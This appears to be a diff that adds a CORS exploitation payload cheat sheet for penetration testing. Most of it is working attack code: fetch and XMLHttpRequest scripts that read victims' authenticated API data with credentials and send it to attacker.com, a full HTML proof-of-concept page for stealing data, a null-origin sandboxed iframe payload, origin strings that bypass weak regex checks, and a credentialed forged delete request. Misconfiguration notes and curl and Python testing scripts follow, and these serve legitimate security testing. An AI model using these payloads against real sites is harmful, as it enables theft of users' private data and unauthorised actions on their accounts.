@@ -1,0 +1,321 @@
+# CORS (Cross-Origin Resource Sharing) Payloads
+
+## ========================================
+## BASIC CORS EXPLOITATION
+## ========================================
+
+# Simple CORS request
+fetch('https://target.com/api/data', {
+  credentials: 'include'
+})
+.then(response => response.json())
+.then(data => {
+  // Send data to attacker
+  fetch('https://attacker.com/collect', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+});
+
+## ========================================
+## ORIGIN HEADER MANIPULATION
+## ========================================
+
+# Null origin
+Origin: null
+
+# Arbitrary origin
+Origin: https://attacker.com
+
+# Subdomain
+Origin: https://evil.target.com
+
+# Similar domain
+Origin: https://target.com.evil.com
+
+# Protocol variation
+Origin: http://target.com (when expecting https)
+
+## ========================================
+## WILDCARD EXPLOITATION
+## ========================================
+
+# If server uses: Access-Control-Allow-Origin: *
+# Cannot use credentials, but can read public data
+
+fetch('https://target.com/api/public-data')
+.then(response => response.json())
+.then(data => console.log(data));
+
+## ========================================
+## CREDENTIAL THEFT
+## ========================================
+
+# Steal authenticated data
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Attack</title>
+</head>
+<body>
+  <script>
+    fetch('https://target.com/api/user/profile', {
+      credentials: 'include'
+    })
+    .then(response => response.json())
+    .then(data => {
+      // Exfiltrate data
+      fetch('https://attacker.com/log', {
+        method: 'POST',
+        body: JSON.stringify(data)
+      });
+    });
+  </script>
+</body>
+</html>
+
+## ========================================
+## REGEX BYPASS
+## ========================================
+
+# If origin validation uses weak regex
+# Example: /^https?:\/\/.*\.target\.com$/
+
+Origin: https://evil.com/target.com
+Origin: https://target.com.evil.com
+Origin: https://attackertarget.com
+
+## ========================================
+## NULL ORIGIN BYPASS
+## ========================================
+
+# Using sandbox iframe
+<iframe sandbox="allow-scripts allow-same-origin" src="data:text/html,
+  <script>
+    fetch('https://target.com/api/data', {credentials:'include'})
+    .then(r=>r.text())
+    .then(d=>parent.postMessage(d,'*'));
+  </script>
+"></iframe>
+
+# File protocol
+# Origin: null from file:// protocol
+
+## ========================================
+## PREFLIGHT BYPASS
+## ========================================
+
+# Avoid preflight by using simple requests
+# Methods: GET, HEAD, POST
+# Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
+
+fetch('https://target.com/api/action', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'text/plain'
+  },
+  body: 'action=delete'
+});
+
+## ========================================
+## SUBDOMAIN TAKEOVER
+## ========================================
+
+# If CORS allows: Access-Control-Allow-Origin: https://*.target.com
+# Takeover vulnerable subdomain
+
+Origin: https://old-app.target.com (if taken over)
+
+## ========================================
+## EXPLOITATION POC
+## ========================================
+
+# Full PoC - Steal sensitive data
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS Vulnerability PoC</h1>
+  <div id="output"></div>
+  
+  <script>
+    // Steal user data
+    fetch('https://target.com/api/user/settings', {
+      credentials: 'include',
+      mode: 'cors'
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Request failed');
+      }
+      return response.json();
+    })
+    .then(data => {
+      // Display stolen data
+      document.getElementById('output').innerHTML = 
+        '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+      
+      // Exfiltrate to attacker server
+      navigator.sendBeacon('https://attacker.com/collect', 
+        JSON.stringify(data));
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+  </script>
+</body>
+</html>
+
+## ========================================
+## XMLHTTPREQUEST EXPLOITATION
+## ========================================
+
+# Traditional XHR
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      // Send data to attacker
+      var exfil = new XMLHttpRequest();
+      exfil.open('POST', 'https://attacker.com/collect', true);
+      exfil.send(xhr.responseText);
+    }
+  };
+  xhr.open('GET', 'https://target.com/api/sensitive', true);
+  xhr.withCredentials = true;
+  xhr.send();
+</script>
+
+## ========================================
+## TIMING ATTACKS
+## ========================================
+
+# Measure response time differences
+var start = performance.now();
+fetch('https://target.com/api/check?user=admin', {
+  mode: 'no-cors'
+})
+.finally(() => {
+  var time = performance.now() - start;
+  // Analyze timing
+});
+
+## ========================================
+## COMMON MISCONFIGURATIONS
+## ========================================
+
+# 1. Reflecting arbitrary origin
+Access-Control-Allow-Origin: [Reflected from Origin header]
+Access-Control-Allow-Credentials: true
+
+# 2. Null origin allowed
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+# 3. Wildcard with credentials (Invalid)
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+# 4. Regex bypass
+Origin validation: /target\.com$/
+Bypass: evil.target.com.attacker.com
+
+# 5. Subdomain wildcard
+Access-Control-Allow-Origin: https://*.target.com
+Risk: Subdomain takeover
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Test with arbitrary origin
+curl -H "Origin: https://evil.com" -I https://target.com/api/data
+
+# 2. Test with null origin
+curl -H "Origin: null" -I https://target.com/api/data
+
+# 3. Test with credentials
+curl -H "Origin: https://evil.com" -H "Cookie: session=xxx" https://target.com/api/data
+
+# 4. Check response headers
+Access-Control-Allow-Origin
+Access-Control-Allow-Credentials
+Access-Control-Allow-Methods
+Access-Control-Allow-Headers
+
+## ========================================
+## ORIGIN VARIATIONS TO TEST
+## ========================================
+
+https://evil.com
+https://target.com.evil.com
+https://evil.target.com
+https://targetxcom
+https://target_com
+https://target.com%60.evil.com
+https://target.com%00.evil.com
+null
+file://
+data:
+
+## ========================================
+## AUTOMATED TESTING
+## ========================================
+
+# Burp Suite
+# Send to Repeater
+# Modify Origin header
+# Check response headers
+
+# Python script
+import requests
+
+origins = [
+    'https://evil.com',
+    'https://target.com.evil.com',
+    'null',
+    'https://attacker.com'
+]
+
+for origin in origins:
+    r = requests.get(
+        'https://target.com/api/data',
+        headers={'Origin': origin}
+    )
+    acao = r.headers.get('Access-Control-Allow-Origin')
+    acac = r.headers.get('Access-Control-Allow-Credentials')
+    
+    if acao and acac == 'true':
+        print(f'Vulnerable with origin: {origin}')
+        print(f'ACAO: {acao}')
+
+## ========================================
+## EXPLOITATION SCENARIOS
+## ========================================
+
+# 1. Steal authentication tokens
+# 2. Read sensitive user data
+# 3. Perform authenticated actions
+# 4. Bypass IP restrictions
+# 5. Steal CSRF tokens
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+# CORS* extension
+# Manual testing with Repeater
+
+# Browser DevTools
+# Network tab
+# Check response headers
+
+# curl
+curl -H "Origin: https://evil.com" -v https://target.com/api
+
+# corsy (CORS Scanner)
+python corsy.py -u https://target.com
